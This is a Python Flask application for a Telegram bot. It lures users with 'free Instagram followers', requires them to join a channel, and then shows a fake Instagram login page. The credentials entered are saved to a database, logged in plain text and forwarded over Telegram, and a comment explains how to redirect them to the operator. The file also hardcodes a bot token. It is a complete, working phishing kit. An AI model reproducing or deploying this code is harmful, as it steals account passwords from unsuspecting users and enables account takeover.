from flask import Flask, request, jsonify, render_template
import os
import requests
import sqlite3

app = Flask(__name__)

# Get bot token from environment variable
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8499502425:AAGskRZzMIOcb4NSOr9y5kEsEwFzjte0kuU')
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

# Force channel ka username (without @)
FORCE_CHANNEL = os.environ.get('FORCE_CHANNEL', 'freeultraapk')

# Database setup
def init_db():
    conn = sqlite3.connect('instagram_bot.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS credentials
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id INTEGER,
                  username TEXT,
                  password TEXT,
                  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

init_db()

@app.route('/')
def home():
    return "Telegram Bot is Running Successfully!"

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        data = request.get_json()
        print("Received data:", data)
        
        # Process the message
        if 'message' in data and 'text' in data['message']:
            chat_id = data['message']['chat']['id']
            message_text = data['message']['text']
            
            if message_text == '/start':
                # Check if user has joined channel
                user_id = data['message']['from']['id']
                try:
                    chat_member = requests.get(
                        f"{TELEGRAM_API}/getChatMember",
                        params={"chat_id": f"@{FORCE_CHANNEL}", "user_id": user_id}
                    ).json()
                    
                    if chat_member.get('result', {}).get('status') in ['member', 'administrator', 'creator']:
                        # User has joined, show Instagram button
                        keyboard = {
                            "inline_keyboard": [[
                                {
                                    "text": "Instagram Login", 
                                    "web_app": {
                                        "url": f"https://{os.environ.get('RENDER_EXTERNAL_HOSTNAME', 'your-app.onrender.com')}/instagram_login?user_id={user_id}"
                                    }
                                }
                            ]]
                        }
                        
                        requests.post(
                            f"{TELEGRAM_API}/sendMessage",
                            json={
                                "chat_id": chat_id,
                                "text": "🎉 Thanks for joining our channel!\n\nClick the button below to get your free Instagram followers:",
                                "reply_markup": keyboard
                            }
                        )
                    else:
                        # User hasn't joined
                        requests.post(
                            f"{TELEGRAM_API}/sendMessage",
                            json={
                                "chat_id": chat_id,
                                "text": f"❌ Bot use karne ke liye aapko pehle hamara channel join karna hoga:\n\n👉 @{FORCE_CHANNEL}\n\nChannel join karne ke baad /start command phir se type karein."
                            }
                        )
                except Exception as e:
                    print(f"Error checking channel membership: {e}")
        
        return jsonify({"status": "success"})
    except Exception as e:
        print("Error in webhook:", e)
        return jsonify({"status": "error"})

@app.route('/instagram_login')
def instagram_login():
    user_id = request.args.get('user_id', '123')
    return render_template('instagram_login.html', user_id=user_id)

@app.route('/submit_login', methods=['POST'])
def submit_login():
    username = request.form.get('username')
    password = request.form.get('password')
    user_id = request.form.get('user_id')
    
    print(f"Received credentials - User ID: {user_id}, Username: {username}, Password: {password}")
    
    # Save credentials to database
    conn = sqlite3.connect('instagram_bot.db')
    c = conn.cursor()
    c.execute("INSERT INTO credentials (user_id, username, password) VALUES (?, ?, ?)",
              (user_id, username, password))
    conn.commit()
    conn.close()
    
    # Send notification (replace with your user ID for actual use)
    try:
        requests.post(
            f"{TELEGRAM_API}/sendMessage",
            json={
                "chat_id": user_id,  # Replace with your user ID to receive credentials
                "text": f"New Instagram Credentials:\n\nUsername: {username}\nPassword: {password}\n\nFrom User ID: {user_id}"
            }
        )
    except Exception as e:
        print(f"Error sending message: {e}")
    
    # Show success message
    return render_template('success.html')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
